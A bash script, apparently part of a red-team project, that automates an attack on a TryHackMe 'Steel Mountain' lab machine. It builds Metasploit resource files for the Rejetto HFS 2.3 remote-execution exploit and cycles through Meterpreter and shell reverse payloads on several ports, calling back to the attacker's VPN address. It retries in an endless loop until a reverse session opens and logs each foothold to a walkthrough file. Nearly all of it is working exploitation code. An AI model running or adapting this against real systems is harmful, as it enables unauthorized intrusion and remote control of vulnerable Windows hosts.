#!/usr/bin/env bash
set -u

TARGET="10.146.141.173"
BLOG="/home/kali/Redteam-Hermes/docs/walkthroughs/THM/steel-mountain-live.md"
LOGDIR="/home/kali/Redteam-Hermes/logs"
LOG="$LOGDIR/steel_mountain_worker.log"
STATE_DIR="$LOGDIR/steel_state"
mkdir -p "$LOGDIR" "$STATE_DIR"

TS() { date -u +"%Y-%m-%d %H:%M:%SZ"; }
log() { echo "[$(TS)] $*" | tee -a "$LOG"; }
blog_append() {
  {
    echo
    echo "### $(TS) — $1"
    shift
    for l in "$@"; do echo "$l"; done
  } >> "$BLOG"
}

get_attacker_ip() {
  local ip
  ip=$(ip -4 -o addr show dev tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  if [[ -z "$ip" ]]; then
    ip=$(ip -4 -o addr show dev tun1 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  fi
  echo "$ip"
}

target_up() {
  curl -sI --max-time 8 "http://$TARGET:8080" | grep -q "HTTP/1.1"
}

tunnel_health_ok() {
  local tun_count
  tun_count=$(ip -br a | awk '/^tun[0-9]+[[:space:]]+UP/{print $1}' | wc -l)
  if [[ "$tun_count" -gt 1 ]]; then
    log "blocked: multiple VPN tunnels detected (count=$tun_count); waiting for a single active tunnel"
    if [[ ! -f "$STATE_DIR/dup_tunnel_logged" ]]; then
      blog_append "Blocked: duplicate VPN tunnels" \
        "- Multiple active tun interfaces detected; pausing exploit attempts to avoid false filtered/down readings." \
        "- Action required: keep only one active VPN tunnel, then worker will auto-resume."
      touch "$STATE_DIR/dup_tunnel_logged"
    fi
    return 1
  fi

  rm -f "$STATE_DIR/dup_tunnel_logged" 2>/dev/null || true
  return 0
}

attempt_once() {
  local lhost="$1"
  local lport="$2"
  local payload="$3"
  local runlog="$STATE_DIR/msf_${lport}_$(date +%s).log"

  cat > /tmp/steel_mountain_hfs.rc <<EOF
spool $runlog
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS $TARGET
set RPORT 8080
set LHOST $lhost
set LPORT $lport
set payload $payload
run -z
sleep 12
sessions -l
spool off
exit -y
EOF

  msfconsole -q -r /tmp/steel_mountain_hfs.rc >> "$LOG" 2>&1 || true

  if grep -Eqi "(session [0-9]+ opened|Meterpreter session [0-9]+ opened|Command shell session [0-9]+ opened)" "$runlog"; then
    log "foothold success with payload=$payload lport=$lport"
    if [[ ! -f "$STATE_DIR/foothold_logged" ]]; then
      blog_append "Foothold achieved" \
        "- Successful reverse session opened via HFS 2.3 exploit." \
        "- Payload: $payload (LPORT $lport)." \
        "- Next: stabilize shell and begin privesc enumeration."
      touch "$STATE_DIR/foothold_logged"
    fi
    return 0
  fi

  if grep -qi "not a compatible payload" "$runlog"; then
    log "auto-correct: skipped incompatible payload=$payload"
  fi

  return 1
}

log "worker supervisor start (continuous mode)"
blog_append "Autonomous worker resumed" \
  "- Continuous mode enabled: worker will keep retrying until foothold, not stop on failed passes." \
  "- Auto-corrections active: payload compatibility handling + no invalid session commands."

while true; do
  if ! tunnel_health_ok; then
    sleep 30
    continue
  fi

  ATTACKER_IP=$(get_attacker_ip)
  if [[ -z "$ATTACKER_IP" ]]; then
    log "blocked: no tun0/tun1 interface; retry in 60s"
    sleep 60
    continue
  fi

  if ! target_up; then
    log "target 8080 not reachable; retry in 45s"
    sleep 45
    continue
  fi

  log "starting attempt cycle from $ATTACKER_IP"
  nmap -Pn -n -p8080 -sV "$TARGET" >> "$LOG" 2>&1 || true

  success=0
  for lport in 4444 5555 9001; do
    for payload in windows/meterpreter/reverse_tcp windows/shell/reverse_tcp windows/meterpreter/reverse_http; do
      if attempt_once "$ATTACKER_IP" "$lport" "$payload"; then
        success=1
        break 2
      fi
      sleep 3
    done
  done

  if [[ "$success" -eq 0 ]]; then
    log "no foothold this cycle; backoff 90s"
    sleep 90
  else
    log "foothold detected; keep worker alive for follow-up cycles"
    sleep 120
  fi
done
